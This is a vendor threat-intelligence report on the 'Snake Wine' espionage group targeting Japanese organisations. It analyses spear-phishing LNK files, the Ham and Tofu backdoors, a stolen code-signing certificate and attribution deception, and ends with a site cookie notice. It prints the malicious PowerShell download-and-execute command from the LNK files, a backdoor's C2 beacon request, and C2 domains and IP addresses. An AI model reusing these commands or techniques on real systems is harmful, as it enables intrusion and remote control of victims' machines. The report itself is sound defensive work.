@@ -1,0 +1,112 @@
+In an effort to expose a common problem we see happening in the industry, Cylance® would like to shed some light on just how easy it is to fake attribution.
+The key factor we should focus on, as an industry, is determining HOW an attacker can take down an organization, rather than focusing only on the WHO.
+Once we can identify how the attack happened, we can focus on what’s really important – prevention.
+While investigating some of the smaller name servers that APT28/Sofacy routinely use to host their infrastructure, Cylance discovered another prolonged campaign that appeared to exclusively target Japanese companies and individuals that began around August 2016.
+The later registration style was eerily close to previously registered APT28 domains, however, the malware used in the attacks did not seem to line up at all.
+During the course of our investigation, JPCERT published this analysis of one of the group’s backdoors.
+Cylance tracks this threat group internally as ‘Snake Wine’.
+We found the infrastructure to be significantly larger than documented at the link above.
+Cylance believes some of the steps taken by the attacker could possibly be an attempt at a larger disinformation campaign based upon some of the older infrastructure that would link it to a well-known CN-APT group.
+Nearly all of the initial data in this case was gathered from delving further into the domains hosted by ’It Itch.’ South Korea’s National Intelligence Service (NIS) previously leveraged It Itch’s services, as documented by Citizen Lab in this post.
+A number of the samples were signed using the leaked code-signing certificate from the Hacking Team breach.
+To date, all observed attacks were the result of spear phishing attempts against the victim organizations.
+The latest batch used well-crafted LNK files contained within similarly named password-protected ZIP files.
+The LNK files, when opened, would execute a PowerShell command via ‘cmd.exe /c’ to download and execute an additional payload.
+The attackers appeared to prefer the Google URL shortening service ‘goog.gl,’ however, this could easily change as the attacks evolve.
+Figure 1: Encoded PowerShell Cmdlet Contained Within the LNK File
+$2='-nop -w hidden -exec bypass -c "IEX (New-Object  System.Net.Webclient).DownloadString(''https://goo(dot)gl/cpT1NW'')"';if([IntPtr]::Size -eq 8){$3 =  $env:SystemRoot + "\syswow64\WindowsPowerShell\v1.0\powershell";iex "& $3 $2";}else{iex "&  powershell $2";}
+Figure 2: Decoded PowerShell Snippet
+The shortened URL connected to 'hxxxp://koala (dot) acsocietyy (dot) com/acc/image/20170112001 (dot) jpg.'
+This file was in fact another piece of PowerShell code modified from ‘PowerSploit'.
+That file opens a decoy document and executes an approximately 60kb chunk of position independent shellcode.
+The shellcode upon further decoding and analysis is nearly identical to what Cylance calls ‘The Ham Backdoor’ below.
+This particular variant of the backdoor references itself internally as version ‘1.6.4’ and beaconed to ‘gavin (dot) ccfchrist (dot) com.’
+The move to a shellcode-based backdoor was presumably done to decrease overall AV detection and enable deployment via a wider array of methods.
+A public report released here documented a similar case in which several universities were targeted by an email purporting to be from The Japanese Society for the Promotion of Science ‘jsps (dot) go (dot) jp’ regarding the need to renew grant funding.
+The website ‘koala (dot) asocietyy (dot) com’ was also used to host the following PowerShell payloads:
+The payloads contained within each PowerShell script beaconed to the same domain name, with the exception of ‘20170112008.jpg’, which beaconed to ‘hamiltion (dot) catholicmmb (dot) com.’
+Earlier attempts used EXE’s disguised with Microsoft Word document icons and DOCX files within a similarly named ZIP file as documented by JPCERT.
+Cylance has observed the following ZIP files which contained a similarly named executable:
+The Ham Backdoor The Ham Backdoor functions primarily as a modular platform, which provides the attacker with the ability to directly download additional modules and execute them in memory from the command and control (C2) server.
+The backdoor was programmed in C++ and compiled using Visual Studio 2015.
+The modules that Cylance has observed so far provided the ability to:
+Legacy AV appears to have fairly good coverage for most of the samples; however, minor changes in newer samples have considerably lower detection rates.
+JPCERT calls this backdoor ‘ChChes’ for cross-reference.
+The malware employs a number of techniques for obfuscation, such as stack construction of variables and data, various XOR encodings and data reordering schemes, and some anti-analysis techniques.
+Perhaps the most interesting of these, and the one we’ve chosen to key on from a detection perspective, is the following bit of assembly which was the final component in decoding a large encoded block of code:
+lea     edx, [esi+edi] mov     edi, [ebp+var_4] mov     cl, [ecx+edx] xor     cl, [eax+edi] inc     eax mov     edi, [ebp+arg_8] mov     [edx], cl mov     ecx, [ebp+arg_0] cmp     eax, ebx
+This snippet in the analyzed samples used a fixed size XOR key usually 0x66 bytes long but would sequentially XOR every byte by each value of the key.
+This effectively results in a single byte XOR by the end of the operation.
+This operation made little sense in comparison to the other more complicated reordering and longer XOR encodings used prior to this mechanism.
+Cylance only found two variants to this code-block, however, that could be easily modified by the attacker in the future.
+The code also makes extensive use of the multi-byte NOP operation prefixed by 0x0F1F.
+These operations present somewhat of a problem for older disassemblers such as the original Ollydbg, but are trivially patched.
+The network protocol of the backdoor is well described by JPCERT, but Cylance has taken the liberty to clean up their original python snippet, which was provided for decoding the cookie values:
+import hashlib  from Crypto.Cipher import ARC4
+Figure 3: Cleaned Script Originally by JPCERT
+As noted in the JPCERT report, Cylance also found that in most cases of successful infection, one of the earliest modules downloaded onto the system added an additional layer of AES communication to the traffic.
+The backdoor would also issue anomalous HTTP requests with the method ‘ST’ in the event that the C2 server did not respond appropriately to the initial request.
+An example request is shown below:
+Figure 4: Example Request Using the ‘ST’ Method
+The majority of the Ham Backdoors found to date have all been signed using the stolen and leaked Hacking Team code-signing certificate.
+Status: Revoked Issuer: VeriSign Class 3 Code Signing 2010 CA Valid: 1:00 AM 8/5/2011 to 12:59 AM 8/5/2012 Thumbprint: B366DBE8B3E81915CA5C5170C65DCAD8348B11F0 Serial Number: 3F FC EB A8 3F E0 0F EF 97 F6 3C D9 2E 77 EB B9
+Why the attackers chose to use this expired certificate to sign their malware samples is unknown.
+The malware itself bears little resemblance to previous hacking team implants and was likely done purely as an attempt to throw off attribution.
+The only observed persistence method to date is the use of the standard Windows Run key ‘SOFTWARE\Microsoft\Windows\CurrentVersion\Run’ under either a user’s hive or HKLM.
+Cylance found that the following three full file paths were commonly used by this particular backdoor:
+Cylance also identified an earlier sample, which took advantage of a self-extracting RAR and a side loading vulnerability in the legitimate Microsoft Resource Compiler, ‘RC.exe.’ RC.exe will load the DLL ‘RCDLL.dll’ via its import table.
+This modified DLL was responsible for XOR decoding and mapping the shellcode version of the Ham Backdoor.
+This particular sample was stored in a file called ‘RC.cfg’, which was encoded using a single byte XOR against the key of 0x54.
+It appears that this version was only used in early campaigns, as the latest referenced backdoor version Cylance identified was ‘v1.2.2.’
+Based upon Cylance’s observations, the Tofu Backdoor was deployed in far fewer instances than the Ham Backdoor.
+It is a proxy-aware, fully-featured backdoor programmed in C++ and compiled using Visual Studio 2015.
+The Tofu backdoor makes extensive use of threading to perform individual tasks within the code.
+It communicates with its C2 server through HTTP over nonstandard TCP ports, and will send encoded information containing basic system information back, including hostname, username, and operating system within the content of the POST.
+POST /586E32A1FFFFFFFF.aspx HTTP/1.1  Accept: */*  Cookies: Sym1.0: 0  ,Sym2.0: 0  ,Sym3.0: 61456  ,Sym4.0: 1  Host: area.wthelpdesk.com:443  Content-Length: 39  Connection: Keep-Alive  Cache-Control: no-cache
+Figure 5: Example POST Request From the Tofu Backdoor
+Although communication took place on TCP port 443, none of the traffic was encrypted and the custom cookies ‘Sym1.0’ – ‘Sym4.0’ can be used to easily identify the backdoor in network traffic.
+The backdoor has the ability to enumerate processor, memory, drive, and volume information, execute commands directly from the attacker, enumerate and remove files and folders, and upload and download files.
+Commands were sent by the C2 and processed by the backdoor in the form of encoded DWORDs, each correspondeding to a particular action listed above.
+Tofu may also create two different bi-directional named pipes on the system ‘\\.\pipe\1[12345678]’ and ‘\\.\pipe\2[12345678]’ which could be accessed via other compromised machines on the internal network.
+During an active investigation, the file was found at ‘%AppData%\iSCSI_Initiarot.exe’.
+This path was confirmed as a static location in the code that the backdoor would use to copy itself.
+A static Run key was also used by the backdoor to establish persistence on the victim machine (HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Microsoft iSCSI Initiator).
+All of the samples Cylance identified were compiled in November 2016, so these backdoors may have simply been tests as later samples moved back to the shellcode-based Ham Backdoors.
+The backdoors were also similarly signed using the same stolen code-signing certificate from ‘HT Srl.’
+Cylance found that at least half of the infrastructure associated with The Deception Project appeared to be dark or at least unused.
+This suggests that the Snake Wine group will likely continue to escalate their activity and persistently target both private and government entities within Japan.
+Cylance also found an extensive network of Dynamic DNS (DDNS) domains registered via multiple free providers was likely being used by the same group.
+However, Cylance was unable to identify any current samples which communicated with this infrastructure, and have subsequently separated this activity from the rest of the attacker’s infrastructure.
+Many of the DDNS domains were concocted to mimic legitimate windows update domains such as ‘download.windowsupdate(dot)com’, ‘ipv4.windowsupdate(dot)com’, and ‘v4.windowsupdate(dot)com’.
+107.181.160.109 109.237.108.202 151.101.100.73 151.236.20.16 158.255.208.170 158.255.208.189 158.255.208.61 160.202.163.79 160.202.163.82 160.202.163.90 160.202.163.91 169.239.128.143 185.117.88.81 185.133.40.63 185.141.25.33 211.110.17.209 31.184.198.23 31.184.198.38 92.242.144.2
+One of the most perplexing aspects of tracing the infrastructure associated with this particular campaign is that it appeared to lead to a significant number of well-known ‘MenuPass’/ ‘Stone Panda’ domains.
+MenuPass is a well-documented CN-APT group, whose roots go back to 2009.
+The group was first publicly disclosed by FireEye in this report.
+However, many of those domains were inactive for as long as two years and could have easily been re-registered by another entity looking to obfuscate attribution.
+As a result, we’ve only included recent Dynamic DNS domains that were connected to recently registered infrastructure.
+A much larger collection of information is available to trusted and interested parties.
+Please contact us at: deceptionproject (at) Cylance [dot] com.
+The Snake Wine group has proven to be highly adaptable and has continued to adopt new tactics in order to establish footholds inside victim environments.
+The exclusive interest in Japanese government, education, and commerce will likely continue into the future as the group is just starting to build and utilize their existing current attack infrastructure.
+If the past is an accurate indicator, attacks will continue to escalate in both skill and intensity as the attackers implement new tactics in response to defenders acting on previously released information.
+Perhaps the most interesting aspect of the Snake Wine group is the number of techniques used to obscure attribution.
+Signing the malware with a stolen and subsequently publicly leaked code-signing certificate is sloppy even for well-known CN-APT groups.
+Also of particular interest from an attribution obfuscation perspective is direct IP crossover with previous Dynamic DNS domains associated with known CN-APT activity.
+A direct trail was established over a period of years that would lead competent researchers to finger CN operators as responsible for this new activity as well.
+Although the MenuPass Group used mostly publicly available RATs, they were successful in penetrating a number of high value targets, so it is entirely possible this is indeed a continuation of past activity.
+However, Cylance does not believe this scenario to be probable, as a significant amount of time has elapsed between the activity sets.
+Also of particular interest was the use of a domain hosting company that accepts BTC and was previously heavily leveraged by the well-known Russian group APT28.
+In any case, Cylance hopes to better equip defenders to detect and respond to active threats within their network and enable the broader security community to respond to similar threats.
+In terms of defending and responding to malware, attribution is rarely important.
+As new methodologies become more broadly detected, threat actors will continue to embrace alternate and new strategies to continue achieving their objectives.
+Yara rules for this campaign can be found on GitHub here: https://github.com/CylanceSPEAR/IOCs/blob/master/snake.wine.yar
+If you use our endpoint protection product, CylancePROTECT®, you were already protected from this attack.
+If you don't have CylancePROTECT, contact us to learn how our AI based solution can predict and prevent unknown and emerging threats.
+Director of Threat Intelligence at Cylance
+
+        BlackBerry uses cookies to help make our website better.
+Some of the cookies are necessary for proper
+            functioning of the site, while others are to help us understand how you use it.
+Read more here about our cookies, and how you can
+            opt out.
+By continuing to use this site you accept our use of cookies.
